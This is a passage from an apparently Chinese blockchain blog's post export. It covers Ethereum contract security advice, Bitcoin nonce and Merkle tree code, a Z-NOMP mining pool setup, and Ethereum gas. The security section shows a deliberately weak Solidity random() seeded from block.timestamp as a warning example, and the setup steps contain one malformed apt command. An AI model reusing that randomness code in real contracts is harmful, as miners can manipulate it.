来授权（如果有另一个合约调用了你的合约，msg.sender 会成为合约的地址，而且不是调用合约的人的地址）。 更多可见 Solidity 文档 除了授权的这个问题，tx.origin 可能在将来从以太坊协议中移除，所以使用了 tx.origin 的代码在将来不会再被兼容 Vitalik: ‘Do NOT assume that tx.origin will continue to be usable or meaningful.’ 另外值得一提的是，通过使用 tx.origin，你会限制合同之间的互操作性，因为使用 tx.origin 的合同不能被另一个合同使用，因为合同不能是 tx.origin。 时间戳依赖在合同中使用时间戳执行关键功能时有三个主要考虑因素，特别是当涉及到资金转移时。 Gameability注意区块的时间戳是可用被矿工操作的。考虑这个合约： 1234567891011uint256 constant private salt = block.timestamp;function random(uint Max) constant private returns (uint256 result) &#123; //get the best seed for randomness uint256 x = salt * 100/Max; uint256 y = salt * block.number/(salt % 5); uint256 seed = block.number/3 + (salt % 300) + Last_Payout + y; uint256 h = uint256(block.blockhash(seed)); return uint256((h / x)) % Max + 1; // random number between 1 and Max&#125; 当合约使用时间戳来产生随机数时，矿工实际上可以在被验证块的 30 秒内发布时间戳，从而有效地允许矿工预先计算一个更有利于他们抽奖机会的选项。 时间戳不是随机的，不应该在这种情况下使用。 30 秒规则评估时间戳使用的一般经验法则是： 如果合约功能可以容忍30秒的时间漂移，则可以安全使用 block.timestamp 如果您的时间相关事件的比例可以变化 30 秒并保持完整性，则使用时间戳是安全的。 这包括拍卖结束，注册期限等事情。 将 block.number 作为时间戳使用时要当心当合约创建一个 auction_complete 修饰器来表示代币销售的结束，像这样) 123456modifier auction_complete &#123; require(auctionEndBlock &lt;= block.number || currentAuctionState == AuctionState.success || currentAuctionState == AuctionState.cancel) _;&#125; block.number 和 平均出块时间 也可以用来估算时间，但是这不是未来的证明，因为区块时间可以修改（例如 分叉重组 和 难度炸弹）。在一天的销售中，12分钟规则允许人们构建更可靠的时间估计。 弃用/历史 建议由于协议的修改或者 solidity 的提升，这些建议不再相关。They are recorded here for posterity and awareness. 注意被 0 除 （Solidity &lt; 0.4）在版本 0.4 之前，当一个数字除以 0 时，Solidity 会返回零，并且不会引发异常。 确保你至少运行 0.4 版本。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}],"tags":[{"name":"ZhouFyk","slug":"ZhouFyk","permalink":"http://xingyunbite.github.com/tags/ZhouFyk/"},{"name":"以太坊","slug":"以太坊","permalink":"http://xingyunbite.github.com/tags/以太坊/"},{"name":"智能合约","slug":"智能合约","permalink":"http://xingyunbite.github.com/tags/智能合约/"},{"name":"安全开发","slug":"安全开发","permalink":"http://xingyunbite.github.com/tags/安全开发/"}],"keywords":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}]},{"title":"比特币挖矿之随机数","slug":"比特币挖矿之随机数","date":"2018-03-02T08:11:51.000Z","updated":"2018-03-09T09:32:59.585Z","comments":false,"path":"2018/03/02/比特币挖矿之随机数/","link":"","permalink":"http://xingyunbite.github.com/2018/03/02/比特币挖矿之随机数/","excerpt":"","text":"比特币区块头字段分析在比特币挖矿之矿工任务中已经提到矿工的工作量主要就消耗在寻找使区块满足要求的随机数这一步。在比特币区块头的6个字段中，区块版本号nVersion只有在升级的时候才会改变。上一个区块Hash值hashPrevBlock在矿工不想制造软分叉的情况下，由最长链的最后一个区块决定。全网难度压缩表示nBits由全网决定,每2016个区块重新调整一次，调整算法固定。上述三个字段对于每个矿工来说，可以理解为固定的。随机数nNonce即我们要找的解，因其字段大小为4字节，32位，因此存在2^32种可能。打包时间nTime可调整的范围根据前一个区块时间来决定，比上一个区块太超前或者太落后会被其他节点拒绝，一般情况下，矿工会直接使用机器当前时间戳。Merkle树根hashMerkleRoot，因其字段长度为256位，理论上存在2^256种可能，本字段的变化主要在于修改CoinBase交易的输入字段，CoinBase交易的改变会传导到至hashMerkleRoot。根据Hash函数特性，nNonce、nTime、hashMerkleRoot任意改变一个，都会导致区块头Hash值结果产生巨大变化。 随机数调整比特币挖矿的修改主要是体现在调整随机数nNonce上，但是随着算力的不断增长，2^32的调整空间已经很难满足求解的需要，因此比特币采取的处理方式是当遍历完2^32个随机数空间后，调整CoinBase的输入字段，致使hashMerkleRoot改变，再次遍历随机数空间，直到发现满足要求的解为止。当然正常情况下，矿工无法遍历完所有的调整空间(2^256 * 2^32)。下面主要以分析代码的方式展示随机数的调整机制。构建区块头函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162UniValue generateBlocks(std::shared_ptr&lt;CReserveScript&gt; coinbaseScript, int nGenerate, uint64_t nMaxTries, bool keepScript)&#123; // 内循环次数上限 nNonce的调整空间[0,2^16) static const int nInnerLoopCount = 0x10000; int nHeightEnd = 0; int nHeight = 0; &#123; // Don&apos;t keep cs_main locked LOCK(cs_main); // 区块当前高度 nHeight = chainActive.Height(); // 待生成区块高度 nHeightEnd = nHeight+nGenerate; &#125; // nExtraNonce 为CoinBase交易输入部分 unsigned int nExtraNonce = 0; UniValue blockHashes(UniValue::VARR); // 循环生成区块，直到达到指定高度 while (nHeight &lt; nHeightEnd) &#123; // 创建区块模板 std::unique_ptr&lt;CBlockTemplate&gt; pblocktemplate(BlockAssembler(Params()).CreateNewBlock(coinbaseScript-&gt;reserveScript)); if (!pblocktemplate.get()) throw JSONRPCError(RPC_INTERNAL_ERROR, &quot;Couldn&apos;t create new block&quot;); // pblock 待构建区块 CBlock *pblock = &amp;pblocktemplate-&gt;block; &#123; LOCK(cs_main); // 调整CoinBase输入脚本中的nExtranNonce IncrementExtraNonce(pblock, chainActive.Tip(), nExtraNonce); &#125; // pblock-&gt;nNonce &lt; nInnerLoopCount 区块头随机数调整次数不能超过nInnerLooCount // CheckProofOfWork(pblock-&gt;GetHash(),pblock-&gt;nBits,Params().GetConsensus()) 校验当前区块头Hash值是否满足要求 while (nMaxTries &gt; 0 &amp;&amp; pblock-&gt;nNonce &lt; nInnerLoopCount &amp;&amp;!CheckProofOfWork(pblock-&gt;GetHash(), pblock-&gt;nBits,Params().GetConsensus())) &#123; // nNonce++ ++pblock-&gt;nNonce; --nMaxTries; &#125; // 超过最大尝试次数，退出循环 if (nMaxTries == 0) &#123; break; &#125; // 达到内循环次数上限，调整CoinBase交易的nExtraNonce，重新开始循环 if (pblock-&gt;nNonce == nInnerLoopCount) &#123; continue; &#125; std::shared_ptr&lt;const CBlock&gt; shared_pblock = std::make_shared&lt;const CBlock&gt;(*pblock); // 处理挖到的区块 if (!ProcessNewBlock(Params(), shared_pblock, true, nullptr)) throw JSONRPCError(RPC_INTERNAL_ERROR, &quot;ProcessNewBlock, block not accepted&quot;); ++nHeight; // 存放区块头Hash blockHashes.push_back(pblock-&gt;GetHash().GetHex()); //mark script as important because it was used at least for one coinbase output if the script came from the wallet if (keepScript) &#123; coinbaseScript-&gt;KeepScript(); &#125; &#125; return blockHashes;&#125; 校验工作量函数12345678910111213141516171819bool CheckProofOfWork(uint256 hash, unsigned int nBits, const Consensus::Params&amp; params)&#123; bool fNegative; bool fOverflow; arith_uint256 bnTarget; bnTarget.SetCompact(nBits, &amp;fNegative, &amp;fOverflow); // Check range if (fNegative || bnTarget == 0 || fOverflow || bnTarget &gt; UintToArith256(params.powLimit)) return false; // Check proof of work matches claimed amount // 比较区块头hash值是否满足目标值 if (UintToArith256(hash) &gt; bnTarget) return false; return true;&#125; 调整CoinBase输入字段函数12345678910111213141516171819202122void IncrementExtraNonce(CBlock* pblock, const CBlockIndex* pindexPrev,unsigned int&amp; nExtraNonce)&#123; // Update nExtraNonce static uint256 hashPrevBlock; if (hashPrevBlock != pblock-&gt;hashPrevBlock) &#123; nExtraNonce = 0; hashPrevBlock = pblock-&gt;hashPrevBlock; &#125; // nExtranNonce调整 ++nExtraNonce; // 正在打包的区块高度从版本2开始，要求coinbase交易的输入脚本以本区块高度开头 unsigned int nHeight = pindexPrev-&gt;nHeight+1; // Height first in coinbase required for block.version=2 CMutableTransaction txCoinbase(*pblock-&gt;vtx[0]); // 构建coinbase交易的输入脚本 txCoinbase.vin[0].scriptSig = (CScript() &lt;&lt; nHeight &lt;&lt; CScriptNum(nExtraNonce)) + COINBASE_FLAGS; assert(txCoinbase.vin[0].scriptSig.size() &lt;= 100); pblock-&gt;vtx[0] = MakeTransactionRef(std::move(txCoinbase)); // 重新构建Merkle数，计算MerkleRoot pblock-&gt;hashMerkleRoot = BlockMerkleRoot(*pblock);&#125;","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/tags/矿池/"},{"name":"LeonBCK","slug":"LeonBCK","permalink":"http://xingyunbite.github.com/tags/LeonBCK/"},{"name":"比特币","slug":"比特币","permalink":"http://xingyunbite.github.com/tags/比特币/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]},{"title":"比特币挖矿之Merkle树","slug":"比特币挖矿之Merkle树","date":"2018-03-02T08:08:16.000Z","updated":"2018-03-09T09:32:59.585Z","comments":false,"path":"2018/03/02/比特币挖矿之Merkle树/","link":"","permalink":"http://xingyunbite.github.com/2018/03/02/比特币挖矿之Merkle树/","excerpt":"","text":"Merkle树概念Merkle树，通常也被称为Hash Tree，顾名思义，就是存储hash值的一棵树。Merkle树的叶子是数据块的Hash值，非叶子节点是其对应子节点串联字符串的Hash值。在最底层，和哈希列表一样，我们把数据分成小的数据块，有相应的哈希与之对应。但是往上走，并不是直接去运算根哈希，而是把相邻的两个哈希合成一个字符串，然后运算这个字符串的哈希。如果最底层的哈希总数是单数，那么便将最后一个叶子节点复制一份，以构成偶数个叶子节点，这种偶数个叶子节点的树也被称为平衡树。 Merkle树特点1、Merkle树是一种树，大多数是二叉树，也可以是多叉树，当然也都具有树结构的所有特点；2、Merkle树的叶子节点的值是数据集合的单元数据或者单元数据的HASH。3、非叶子节点的值是根据它下面所有的叶子节点值，按照Hash算法计算得到的。 比特币与Merkle树根据之前文章对比特币区块头的分析，可以知道比特币区块头中存在一个hashMerkleRoot字段，这儿的hashMerkleRoot便是区块中所有交易构建的Merkle树的树根value，比特币使用Merkle树来归纳一个区块中的所有交易，当某个节点试图修改某个区块中的交易时，交易的Hash值改变，这种改变层层传递，会导致MerkleRoot值改变，进而导致区块头的Hash值改变，这将导致软分叉，要想使这种改变被全网接受，只能通过大算力，使包含该区块的链成为最长链，这种修改的成本无疑是巨大的。由于Merkle树结构的特殊性，通过Merkle树，轻量级节点SPV可以很容易验证交易的存在，下面进行具体介绍。SPV节点不保存所有交易，也不会下载整个区块，仅保存区块头，当需要验证交易时，假设要验证区块图中交易tx3,SPV节点会通过向相邻节点索要Merkle树分支（H4-&gt;H12-&gt;H5656-&gt;root）来确认交易的存在性和正确性。得到了分支数据，SPV节点可以很容易计算出H34-&gt;H1234-&gt;root,通过这种计算得到的root与本地存储的区块头中的hashMerkleRoot字段比较，可以很容易得到验证结果。 比特币最初版本构建Merkle树的实现代码如下：1234567891011121314151617181920uint256 BuildMerkleTree() const&#123; vMerkleTree.clear(); // 清空Merkle树原有内容 vMerkleTree是一个vector&lt;uint256&gt; 结构 foreach(const CTransaction&amp; tx, vtx) // 遍历所有交易 vtx是一个vector&lt;CTransaction&gt; 结构 vMerkleTree.push_back(tx.GetHash()); // 将交易Hash放入Merkle树，作为叶子节点 int j = 0; // 构建Merkle树的非叶节点 for (int nSize = vtx.size(); nSize &gt; 1; nSize = (nSize + 1) / 2) &#123; for (int i = 0; i &lt; nSize; i += 2) &#123; int i2 = min(i+1, nSize-1); vMerkleTree.push_back(Hash(BEGIN(vMerkleTree[j+i]), END(vMerkleTree[j+i]), BEGIN(vMerkleTree[j+i2]), END(vMerkleTree[j+i2]))); &#125; j += nSize; &#125; // 返回vMerkleTree的最后一个元素，即为MerkleRoot return (vMerkleTree.empty() ? 0 : vMerkleTree.back());&#125; 获取Merkle树分支的代码如下：123456789101112131415161718vector&lt;uint256&gt; GetMerkleBranch(int nIndex) const&#123; // 判断MerkleTree是否为空，若为空，则重新构建 if (vMerkleTree.empty()) BuildMerkleTree(); // vMerkleBranch用来保存分支数据 vector&lt;uint256&gt; vMerkleBranch; int j = 0; // 填充分支数据 for (int nSize = vtx.size(); nSize &gt; 1; nSize = (nSize + 1) / 2) &#123; int i = min(nIndex^1, nSize-1); vMerkleBranch.push_back(vMerkleTree[j+i]); nIndex &gt;&gt;= 1; j += nSize; &#125; return vMerkleBranch;&#125;","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/tags/矿池/"},{"name":"LeonBCK","slug":"LeonBCK","permalink":"http://xingyunbite.github.com/tags/LeonBCK/"},{"name":"比特币","slug":"比特币","permalink":"http://xingyunbite.github.com/tags/比特币/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]},{"title":"zcash矿池之Z-NOMP(Node Open Mining Portal)","slug":"zcash矿池之Z-NOMP-Node-Open-Mining-Portal","date":"2018-03-02T05:00:28.000Z","updated":"2018-03-09T09:32:59.581Z","comments":false,"path":"2018/03/02/zcash矿池之Z-NOMP-Node-Open-Mining-Portal/","link":"","permalink":"http://xingyunbite.github.com/2018/03/02/zcash矿池之Z-NOMP-Node-Open-Mining-Portal/","excerpt":"","text":"Zcash作为采用零知识证明（zk-SNARKS）实现完全隐私保护的加密货币,在技术地位上成为竞争币一哥指日可待. z-classic在github发布的矿池Z-NOMP，是基于Node Open Mining Portal的Equihash矿池，可以部署的币种有zen，zcl和zec等使用Equihash算法的矿池。 警告:请勿直接用于生产环境使用该软件,任何内容的修改都会对矿池造成损失. 首先，部署环境，我们使用的是ubuntu server 16.04 x64的系统。 1.安装z-nomp依赖： 1234sudo apt-get install updatesudo apt-get install build-essential libsodium-dev npm gitsudo npm install n -gsudo n 8.9.4 2.下载和安装z-nomp： 12345git clone https://github.com/joshuayabut/node-open-mining-portal.git /poolcd /poolnpm config set registry https://registry.npm.taobao.org #使用淘宝npm镜像npm updatesudo npm install #就算root账户也一定要加sudo 3.矿池配置文件：修改示例文件config_example.json。 12mv config_example.json config.jsonvim config.json 下面提供一些主要配置说明：123456789101112131415161718192021222324\"redis\": &#123; \"host\": \"127.0.0.1\", #redis地址 \"port\": 6379, #redis端口 \"password\": \"\" #redis密码&#125; &#125;, \"website\": &#123; \"enabled\": true, \"host\": \"0.0.0.0\", #website地址 \"port\": 8080, #website端口 \"stratumHost\": \"cryppit.com\", #挖矿域名 \"stats\": &#123; \"updateInterval\": 30, \"historicalRetention\": 14400, \"hashrateWindow\": 300 &#125;, \"tlsOptions\" : &#123; \"enabled\": false, #ssl挖矿 \"cert\": \"\", #ssl公钥地址 \"key\": \"\" #ssl私钥地址 &#125;&#125;, 4.数字货币配置： 进入pool_config，重新命名zcash_example.json为zcash.json并修改示例内容. 123cd pool_configmv zcash_example.json zcash.jsonvim zcash.json 主要配置文件说明： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748\"enabled\": true, #设置打开coin\"coin\": \"zcash.json\", #coin配置文件\"address\": \"\", #coinbase地址，即挖到块后保存的地址，且该地址一定要在节点中 \"zAddress\": \"\", #Z地址\"tAddress\": \"\", #T地址\"rewardRecipients\": &#123; \"\": 0.2, #手续费和接收手续费地址&#125;,\"paymentProcessing\": &#123; \"minConf\": 10, \"enabled\": false, #支付进程 \"paymentMode\": \"prop\", #挖矿模式 \"_comment_paymentMode\":\"prop, pplnt\", \"paymentInterval\": 20, \"minimumPayment\": 0.1, #最低支付额 \"maxBlocksPerPayment\": 1, \"daemon\": &#123; #节点信息 这里为支付节点 \"host\": \"127.0.0.1\", \"port\": 19332, \"user\": \"testuser\", \"password\": \"testpass\" &#125;&#125;,\"ports\": &#123; #支付端口和难度 \"3032\": &#123; \"diff\": 0.05, \"tls\": false, \"varDiff\": &#123; \"minDiff\": 0.04, \"maxDiff\": 16, \"targetTime\": 15, \"retargetTime\": 60, \"variancePercent\": 30 &#125;&#125;&#125;,\"daemons\": [ #节点 这里为挖矿节点 可与支付节点一致 &#123; \"host\": \"127.0.0.1\", \"port\": 18232, \"user\": \"rpcuser\", \"password\": \"rpcpassword\" &#125; ], 5.coin配置： 进入coins目录可以看到开发者提供了zclassic和zcash等coin的配置文件，同时zcash_testnet.json为zcash的testnet方便测试，使用testnet进行测试时请保证节点一定在testnet模式。如果需要加增加coin请参考开发者提供的其他coin信息进行修改，同时在pool_config里增加池信息，以后我们在进行陆续说明。 ok，现在已经配置完成，我们返回/pool目录 ，使用npm start 来启动z-nomp 矿池，就可以把矿机接入来进行挖矿了。","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"lucas556","slug":"lucas556","permalink":"http://xingyunbite.github.com/tags/lucas556/"},{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/tags/矿池/"},{"name":"zcash","slug":"zcash","permalink":"http://xingyunbite.github.com/tags/zcash/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]},{"title":"以太坊，燃气，燃料 和 费用（翻译）","slug":"以太坊，燃气，燃料-和-费用","date":"2018-03-01T08:20:06.000Z","updated":"2018-03-09T09:32:59.585Z","comments":false,"path":"2018/03/01/以太坊，燃气，燃料-和-费用/","link":"","permalink":"http://xingyunbite.github.com/2018/03/01/以太坊，燃气，燃料-和-费用/","excerpt":"","text":"来自 BTC Relay 的首席开发人员 Joseph Chow ：Ethereum,Gas,Fuel &amp; Fees 以太坊是分布式和诚实的应用程序的平台，可在没有任何管理员或单点故障的全球点对点网络上运行。这些应用程序没有停机时间，任何人都可以创建它们：这是无许可的创新。这些应用是诚实的，不可改变的，并且在编码时总是互操作。从这个角度来说，智能合约的术语是合理的，因为它们是始终遵循其创建时所设定的条款的最终合约。 使这成为可能的核心实际上是世界计算机。在技术上称为以太坊虚拟机（EVM），它包括用于计算和数据存储的操作。交易代表世界计算机内的单个会话，它是交互的单位，类似于句子如何作为语法意义的单位，尽管单个句子可以包含很多单词。 燃气（gas）是什么？燃气是世界计算机使用的计量单位。做一个类比，电量按千瓦小时计量，而在以太坊中使用更多的算力和存储代表着会使用更多的燃气。计量的一个基本原因是它可以激励人们（矿工）操作世界计算机。这些矿工对交易的处理会收取费用，费用则取决于计量方案：燃气。 EVM 中的每个操作都会消耗燃气。例如，一个乘法（MUL）消耗 5 燃气而一个加法（ADD）消耗 3 燃气。以太坊操作的燃气消耗表格 将燃气看做是燃料的代名词 计量与费用不同，而燃气和以太币也不同。为了帮助说清楚这个，将燃气看做是燃料的代名词。一笔交易必须提供足够的燃料，或者初始燃气，来支持 EVM 的计算和存储的使用。所有的剩余燃气会回退给交易的发起人：初始化该笔交易的用户。一笔燃料耗尽的交易会回滚，但是依旧包含在区块中，并且相关的费用依旧支付给矿工。 了解了燃料角度的概述，让我们来看看费用相关的概述。在 EVM 中，每个操作都会消耗已经预定义数量的燃气（比如，一个乘法操作总是消耗 5 燃气），用户在每笔交易中都可以指定燃气价格。当前的燃气价格是 0.02μ 以太币，或者 0.00000002 ETH。交易发起人支付给矿工的费用是交易的 (开始燃气 - 剩余燃气) * 燃气价格。 这里是一个关于交易燃料和交易费用的影响的总结： 燃料 费用 通常 EVM 中的每个操作都会消耗一定数量预先已经设定好的燃料；用户不能更改它。每笔交易都有一个用户指定的初始燃气。 每笔交易都有用户指定的燃料价格（当前默认为每单位燃气 0.02μ ETH） 交易开始时 交易发起人应该提供足够的燃料：初始燃气。剩余燃气 = 初始燃气。 交易发起人必须支付所有燃料。放置 初始燃气 * 燃气价格 = 以太币 在托管中。 每个操作 剩余燃气会由于操作消耗而减少 知道交易完成（不论成功不成功），才会有后续的操作。 不成功的交易 剩余燃气为零，还有未完成的操作。这导致一个燃气耗尽的异常，而所有的操作都会被撤销 所有托管的费用都会被支付给矿工 成功的交易 所有剩余的燃气会回退给交易发起人 （初始燃气 - 剩余燃气） * 燃气价格 = 费用 支付给矿工；剩余燃气 * 燃气价格 = 回退给交易发起人的费用。 在交易开始时，被要求用来作为初始燃气的以太币会被搁置，然后剩余燃气值会被设置为初始燃气值。随着交易中的每个操作，燃气会被消耗，剩余燃气逐渐变少。如果发生燃气耗尽的异常，所有的操作都会回滚，而之前搁置的所有的以太币都会被支付给矿工。如果交易成功执行完毕，所有的剩余部分的燃气会回退给交易发起人，而已经消耗的燃气则支付给矿工。 简单的例子在下面的情景模拟中，假设存储消耗 45 燃气，一个加法操作消耗 10 燃气。这个场景涉及到在 EVM 中存储数字 31，将两个数相加，然后存储它们的和。让我们假设交易发起人指定了 150 的初始燃气，和 0.02μ 以太币的燃气价格。下面是 EVM 处理该笔交易的描述： 操作消耗的燃气 剩余燃气 交易开始 150 存储 31 45 105 两个数相加 10 95 存储和 45 50 交易结束 数字 31 和 加法的和- -已经被存储写入区块链 交易发起人支付给矿工的费用是： （150–50) × 0.02µETH = 2µETH = 0.000002 ETH 燃料与费用交易发起人提供足够的燃料与提供足够的费用是有区别的。以下是对交易的可能影响： 燃料 费用 太低 不会广播给矿工（错误：intrinsic gas too low） 矿工不会执行计算 低 少量计算或者燃料耗尽 之后会打包进区块 中等 通常是理想的 通常是理想的 高 可能导致打包被延迟 尽快被打包入区块 太高 不会广播给矿工（错误：exceeds block gas limit） 如果交易发起人没有足够的以太币，则不会广播给矿工 尽管提供了费用，但是一笔燃料很低的交易甚至可能不会到达矿工处。如果一笔交易提供了足够的燃料，但是费用很低，即使该交易到达矿工处，当矿工看到这个费用之后也不会对其进行计算处理。费用决定了交易将被打包进入区块的顺序。而提供高燃料会导致交易打包时间更长的原因在本文中 高初始燃气可能会导致延迟 部分。 初始燃气让我们讨论一下交易开始时的燃料需求。抽象地说，在被允许使用世界计算机的计算和存储之前，世界计算机需要知道交易发起人是否有能力支付费用。具体地说，在处理交易之前，矿工需要知道自己是否可以获得报酬。一笔交易需要指定它愿意花费的最大燃料值。对于本文的目的来说，这个需求被称作初始燃气。初始燃气是交易的重要部分。不幸的是，不同的文档使用了不同的词来描述这个关键部分： 以太坊白皮书中使用了 初始燃气 以太坊黄皮书中使用了燃料限制 Geth 和 web3.js 等软件中，简单地使用了 “燃气”。 因为在通常情况下，不真正运行计算（关联 停机问题），矿工是不知道到底需要多少计算量的，所以初始燃气使事情变得更加简单（而不用 “燃气作为支付的消耗方式”（away from say a pay as gas is consumed approach） 这种说法）。作为一个以太坊应用的用户，必须提供初始燃气似乎很复杂，但开发人员可以使用一些工具来估计初始燃气并隐藏用户的详细信息。 燃料耗尽异常一笔交易提供了它愿意消耗的最大燃料值。该燃气会被 EVM 中的每个操作消耗。如果燃料消耗完毕，而交易还未完成，那么一个燃料耗尽的异常就会发生。交易发起人为已经执行的操作支付，而交易也被打包进区块，但是所有的状态改变（比如合约的创建，值的存储，和日志的写入）都会回滚。 让我们还是使用第一个例子作为场景，但是这次交易发起人指定初始燃气为 90（而不是 150）。这里是执行的示意图： 操作的燃料消耗 剩余燃料 交易开始 90 存储 31 45 45 求和 10 35 保存和 45 燃料耗尽 交易结束 因为燃料耗尽，存储的 31 会回滚 耗尽 在交易开始时，交易发起人需要拿出所有燃料的资金： 初始燃气 * 燃气价格 = 存放在柜台的以太币。柜台中的以太币数量为： 90 × 0.02µETH = 1.8µETH 当每个操作执行时，燃气会消耗，而在存储和时产生了燃料耗尽异常。这会导致所有的操作撤销，代表数字 31 会被回滚到它之前存储的值，但是交易依旧被打包进入区块链，而且矿工获得所有的酬金：1.8μ ETH。 燃气回退EVM 中有两个负值燃气的操作： 清空合约是 -24000 清空存储是 -15000 当 EVM 执行了这样的一个操作，它将被记录在单独的退款计数器中。燃气退款仅在交易结束时提供。 此外，最高返还金额等于一半已经消耗的燃气。 一个关键点在于，一笔交易的燃料永远不会增加。当 EVM 执行操作时，燃料总是减少（当一些合约或者存储被清空，退款计数器会增加）。如果燃料到零或者负数，那么立马会产生一个燃料耗尽异常：退款计数器中有多少燃气并不重要。一笔交易为了能够使用燃气退款，它必须避免燃料耗尽异常。假设一笔交易有足够的燃气，然后它就能使用退款计数器中的燃气。 退款的燃气值最多为消耗的燃气值的一半。例如，如果一笔交易使用了 60000 燃气，然后清空了 2 个合约而获得 48000 的一笔退款（每笔 24000），交易发起人还是需要支付给矿工 30000 燃气。这激励了矿工使用负值燃气操作处理交易，因为这给了他们收入，并确保了矿工不可能为他人的计算付款。 区块燃气限制（Block gas limit:BGL）回顾一下，初始燃气由用户指定，是一笔交易将要消耗的燃料最大值。那么一个区块中能够容纳多少交易呢？答案是直到所有交易的初始燃气总和达到区块燃气限制（BGL）为止。当前(2016/6/23)的 BGL 是 4,712,388 （1.5π 的数字形式），表示能够在一个区块（平均出块时间 15 秒）中容纳 224 笔初始燃气为 21000 的交易。为了防止像比特币一样对区块是否变大产生分歧，以太坊协议允许矿工对自己的区块往任意方向进行 1/1024(0.0976%) 幅度的 BGL 调整。与协议不同的是默认的采矿策略，其最小 BGL 为 4,712,388。 高初始燃气可能存在的延迟既然燃料耗尽异常对交易发起人来说几乎是在浪费金钱，那么将初始燃气设置得更高总是更好的。所以，交易发起人为什么不总是将初始燃气指定为 4,000,000 呢？ 答案在于交易的初始燃气和它实际消耗的燃气之间的差异。矿工只会获得一笔交易实际消耗的燃气；所有未使用的燃气会被回退给交易发起人。 如果同时存在一笔初始燃气为 4M 的交易和 100 笔初始燃气为 40,000 的交易，矿工可能会选择后者，因为这 100 笔交易的收入有更高的预测性。如果一笔初始燃气为 4M 的交易实际只消耗了 1M 燃气，那么矿工将损失 3M 的潜在燃气收入。所以，矿工更愿意优先考虑一些“小”交易，而不是拥有高初始燃气（除非内在气体也十分高）的一笔交易。这会导致高初始燃气的交易在被打包之前存在延迟，并且也解释了过高的初始燃气可能会是有害的。 绕过交易所以太坊有两种类型的账户： 用户账户（由私钥控制） 合约（由代码控制） 发送以太币到一个用户账户需要 21000 的燃气费用，而发送以太币到合约则需要更高的费用，这个费用取决于合约代码和交易中发送的数据。一些交易所会对他们所有的交易都只提供 21000 燃气，这表示在用户想要从交易所发送以太币到他们 Mist（以太坊钱包） 中的合约钱包时，交易会耗尽燃料，以太币永远也不会发送到用户的合约钱包。 计量和费用关于计量和费用之间的区别还有一点需要注意。在比特币中，计量是根据字节来的：交易中的字节数。在以太坊中，计算也需要计量，因为少量的代码也可能被编码成永远执行。计量计算量也是使用燃气的一个原因。但是拥有燃气不代表需要费用。 比如，在一个私链上，每个账户每天可以拥有 X 燃气，或者是每笔交易 Y 燃气，或者其他方案。另一方面，有费用不代表需要燃气：费用可以基于不同的计量，如字节。对于公有链上的安全性来说，燃气和费用两者都需要，而替代方案可能更适合私有链（比如，对于任何人都可以创建账户的公有链来说，每个账户每天有 X 燃气，可以被“女巫攻击”（Sybil-attacked））。 结论燃气是使用世界计算机的计量方式和燃料，与使用世界计算机所支付的以太币费用是不同的。提供足够的燃料和足够的费用，两者之间是有区别的。运行时燃料耗尽会花费钱，而提供更多的燃气会使得更加安全，反正所有的未使用的燃气都会被回退。燃气是以太坊的核心部分，它的大多数话题已经被讨论过。这里有更多关于它的信息，包括估计燃气，内在燃气（intrinsic gas），燃气价格预告（gas price oracle），交易大小的影响，读者可以在本文的基础上进一步地探索和理解。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}],"tags":[{"name":"ZhouFyk","slug":"ZhouFyk","permalink":"http://xingyunbite.github.com/tags/ZhouFyk/"},{"name":"以太坊","slug":"以太坊","permalink":"http://xingyunbite.github.com/tags/以太坊/"},{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/tags/区块链/"},{"name":"燃料","slug":"燃料","permalink":"http://xingyunbite.github.com/tags/燃料/"},{"name":"gas","slug":"gas","permalink":"http://xingyunbite.github.com/tags/gas/"},{"name":"翻译","slug":"翻译","permalink":"http://xingyunbite.github.com/tags/翻译/"}],"keywords":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}]},{"title":"比特币挖矿之矿工任务","slug":"比特币挖矿之矿工任务","date":"2018-02-28T03:10:09.000Z","updated":"2018-03-09T09:54:45.402Z","comments":false,"path":"2018/02/28/比特币挖矿之矿工任务/","link":"","permalink":"http://xingyunbite.github.com/2018/02/28/比特币挖矿之矿工任务/","excerpt":"","text":"挖矿介绍中本聪为了实现比特币的去中心化，引入了工作量证明机制(proof of work)。工作量证明的理念是把随机选取节点记账改为根据算力来选取节点，任何一个提议并创建区块的节点要想构建下一个区块，必须找到一个解，当把这个解与前区块的哈希值、当前时间戳、区块包含交易集合唯一标识MerkleRoot等组装起来，带入哈希函数时，刚好小于指定的目标值，这一系列操作就称为“挖矿”，而进行挖矿的人则被称为”矿工”。 